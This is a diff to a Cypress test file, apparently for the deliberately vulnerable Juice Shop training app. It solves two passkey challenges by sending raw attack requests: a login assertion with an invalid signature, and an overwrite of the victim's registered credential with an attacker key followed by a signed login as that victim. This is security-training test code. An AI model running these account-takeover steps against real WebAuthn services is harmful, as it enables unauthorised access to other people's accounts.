@@ -1,8 +1,5 @@
 describe('/', () => {
-  // The frontend passkey UI (Manage Passkeys page + "Login with Passkey" button) is not available
-  // yet, so the honest virtual-authenticator happy path is deferred. Both challenges are driven here
-  // through raw attack payloads with cy.request, mirroring the authoritative API tests in
-  // test/api/webAuthn.test.ts. A real/virtual authenticator cannot forge either payload.
+  // Neither exploit payload can be produced by a real or virtual authenticator, so both are sent as raw requests.
 
   describe('challenge "webauthnSignatureChallenge"', () => {
     it('should solve by submitting a login assertion with an invalid signature', () => {
@@ -25,12 +22,12 @@ describe('/', () => {
         })
       })
 
-      cy.expectChallengeSolved({ challenge: 'Passkey Signature Forgery' })
+      cy.expectChallengeSolved({ challenge: 'Passkey Bypass' })
     })
   })
 
   describe('challenge "webauthnCredentialOverwriteChallenge"', () => {
-    it("should solve by registering the victim's credential ID with an attacker public key", () => {
+    it("should solve by overwriting the victim's credential and logging in with the attacker key", () => {
       cy.request({
         method: 'POST',
         url: '/rest/user/login',
@@ -46,7 +43,7 @@ describe('/', () => {
           const { challenge } = optionsResponse.body.options
           const { regToken } = optionsResponse.body
 
-          cy.task('ForgePasskeyAttestation', { challenge }).then(({ attestation }: any) => {
+          cy.task('ForgePasskeyAttestation', { challenge }).then(({ attestation, privateKeyPem }: any) => {
             cy.request({
               method: 'POST',
               url: '/rest/webauthn/register-verify',
@@ -55,11 +52,31 @@ describe('/', () => {
             }).then((verifyResponse) => {
               expect(verifyResponse.body.verified).to.equal(true)
             })
+
+            // The victim's stored public key is now the attacker's, so a genuinely signed login works.
+            cy.request({
+              method: 'POST',
+              url: '/rest/webauthn/login-options',
+              body: { email: 'passkey-user@juice-sh.op' }
+            }).then((loginOptionsResponse) => {
+              const loginChallenge = loginOptionsResponse.body.options.challenge
+              const { authToken } = loginOptionsResponse.body
+
+              cy.task('SignPasskeyAssertion', { challenge: loginChallenge, privateKeyPem }).then((assertion) => {
+                cy.request({
+                  method: 'POST',
+                  url: '/rest/webauthn/login-verify',
+                  body: { assertion, authToken }
+                }).then((verifyResponse) => {
+                  expect(verifyResponse.body.authentication.umail).to.equal('passkey-user@juice-sh.op')
+                })
+              })
+            })
           })
         })
       })
 
-      cy.expectChallengeSolved({ challenge: 'Passkey Credential Overwrite' })
+      cy.expectChallengeSolved({ challenge: 'Passkey Hijack' })
     })
   })
 })
